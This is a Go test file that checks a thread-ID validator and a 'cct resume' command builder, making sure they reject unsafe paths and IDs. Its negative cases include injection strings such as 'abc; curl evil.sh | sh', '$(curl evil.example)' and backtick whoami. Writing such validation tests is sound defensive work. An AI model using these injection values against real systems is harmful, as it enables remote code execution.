package codexreconcile

import (
	"strings"
	"testing"
)

func TestValidThreadID(t *testing.T) {
	for _, id := range []string{
		"aaaaaaaa-1111-4111-8111-111111111111",
		"AAAAAAAA-1111-4111-8111-111111111111",
	} {
		if !ValidThreadID(id) {
			t.Errorf("ValidThreadID(%q) = false, want true", id)
		}
	}
	for _, id := range []string{
		"",
		"aaaaaaaa111141118111111111111111",
		"aaaaaaaa-1111-4111-8111-11111111111",
		"gggggggg-1111-4111-8111-111111111111",
		"aaaaaaaa-1111-4111-8111-111111111111; calc",
		" aaaaaaaa-1111-4111-8111-111111111111",
	} {
		if ValidThreadID(id) {
			t.Errorf("ValidThreadID(%q) = true, want false", id)
		}
	}
}

func TestResumeFallbackCommand(t *testing.T) {
	const id = "aaaaaaaa-1111-4111-8111-111111111111"
	for _, home := range []string{
		`C:\Users\Example User\.codex`,
		"/home/example/.codex",
		`D:\用户\Codex Home`,
	} {
		command, ok := ResumeFallbackCommand(id, home)
		if !ok {
			t.Errorf("ordinary home %q was rejected", home)
			continue
		}
		want := `cct resume ` + id + ` --run --codex-home "` + home + `"`
		if command != want {
			t.Errorf("command = %q, want exact rendering %q", command, want)
		}
	}

	for _, home := range []string{
		"",
		`C:\unsafe"; calc; "`,
		"/tmp/$(curl evil.example)",
		"/tmp/`whoami`",
		`C:\Users\%USERNAME%\.codex`,
		"C:\\trailing\\",
		`\\server\share\.codex`,
		`/tmp/double\\backslash`,
		"/tmp/new\nline",
	} {
		if command, ok := ResumeFallbackCommand(id, home); ok {
			t.Errorf("unsafe home %q produced command %q", home, command)
		}
	}
	if command, ok := ResumeFallbackCommand("abc; curl evil.sh | sh", "/tmp/codex"); ok {
		t.Errorf("unsafe thread ID produced command %q", command)
	}
}

func TestResumeFallbackCommandRejectsCrossShellMetacharacters(t *testing.T) {
	const id = "aaaaaaaa-1111-4111-8111-111111111111"
	for _, r := range []rune{'"', '\'', '`', '$', ';', '&', '|', '<', '>', '(', ')', '%', '!', '^'} {
		home := "/tmp/codex" + string(r) + "home"
		if command, ok := ResumeFallbackCommand(id, home); ok {
			t.Errorf("shell metacharacter %q in home produced command %q", r, command)
		}
	}
}

func TestResumeFallbackCommandsFiltersUnsafeValuesAndAppliesLimit(t *testing.T) {
	const home = "/home/example/.codex"
	ids := []string{
		"abc; curl evil.sh | sh",
		"aaaaaaaa-1111-4111-8111-111111111111",
		"bbbbbbbb-2222-4222-8222-222222222222",
	}
	commands := ResumeFallbackCommands(ids, home, 1)
	if len(commands) != 1 {
		t.Fatalf("commands = %#v, want one safe command", commands)
	}
	if strings.Contains(commands[0], "curl") ||
		!strings.Contains(commands[0], "aaaaaaaa-1111-4111-8111-111111111111") {
		t.Fatalf("unexpected command: %q", commands[0])
	}
}
